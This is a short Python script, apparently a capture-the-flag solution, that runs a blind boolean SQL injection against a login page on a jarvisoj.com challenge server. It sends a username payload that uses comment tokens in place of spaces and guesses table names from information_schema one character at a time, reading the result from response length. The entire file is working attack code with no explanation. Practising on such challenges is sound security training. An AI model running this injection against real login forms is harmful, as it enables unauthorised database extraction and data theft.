import string
import requests

url = 'http://web.jarvisoj.com:32787/login.php'
s = string.digits + string.ascii_lowercase + string.ascii_uppercase + string.punctuation
payload = {
    'username' : '',
    'password' : 1
}
result = ''

username_template = "'or/**/ascii(substr((select/**/group_concat(table_name)from/**/information_schema.tables/**/where/**/table_schema=database()),{0},1))={1}#"

st = 0
for i in range(1,50):
    st = 0
    for c in s :
        asc = ord(c)
        payload['username'] = username_template.format(i,asc)
        response = requests.post(url, data=payload)
        if len(response.text) < 1192 :
            result += c
            print('tables: ', result)
            st = 1
    if st == 0:
        break
print('tables: ', result)
